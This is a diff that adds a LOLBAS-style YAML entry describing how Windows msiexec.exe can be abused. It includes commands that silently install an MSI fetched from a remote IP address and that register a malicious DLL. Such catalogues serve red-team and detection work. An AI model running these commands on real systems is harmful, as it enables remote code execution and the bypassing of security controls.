@@ -1,0 +1,44 @@
+---
+Name: 'Msiexec.exe'
+Description: 'Can be used to execute unsigned DLL files and install malicious msi files'
+Created: '2018-06-12'
+Commands:
+  - Command: 'msiexec /q /i http://192.168.100.3/tmp/cmd.png'
+    Description: 'Installs the target remote & renamed .MSI file silently.'
+  - Command: 'msiexec /y "C:\folder\evil.dll"'
+    Description: 'Calls DLLRegisterServer to register the target DLL.'
+  - Command: 'msiexec /z "C:\folder\evil.dll"'
+    Description: 'Calls DLLRegisterServer to un-register the target DLL.'
+Windows Binary: true
+Bypasses Default AppLocker Rules: false
+Notes: ''
+MITRE:
+  - ID: ''
+    Link: ''
+Atomic Red Teaming:
+  - Description: ''
+    Code: ''
+Full path:
+  - Path: 'c:\windows\system32\msiexec.exe'
+  - Path: 'c:\windows\sysWOW64\msiexec.exe'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/'
+  - Link: 'https://twitter.com/PhilipTsukerman/status/992021361106268161'
+Acknowledgement:
+  - Name: 'netbiosX'
+    TwitterHandle: '@netbiosX'
+    Blog: 'https://pentestlab.blog/'
+  - Name: 'Philip Tsukerman'
+    TwitterHandle: '@PhilipTsukerman'
+    Blog: ''
+---
